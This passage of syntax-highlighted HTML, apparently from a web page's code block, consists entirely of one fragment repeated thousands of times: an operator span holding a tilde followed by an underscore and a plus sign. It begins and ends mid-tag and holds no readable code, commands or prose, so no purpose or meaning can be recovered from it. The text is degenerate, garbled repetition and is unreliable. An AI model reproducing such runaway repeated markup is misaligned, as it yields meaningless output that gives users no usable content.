operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span class="token operator">~</span>_<span class="token operator">+</span><span 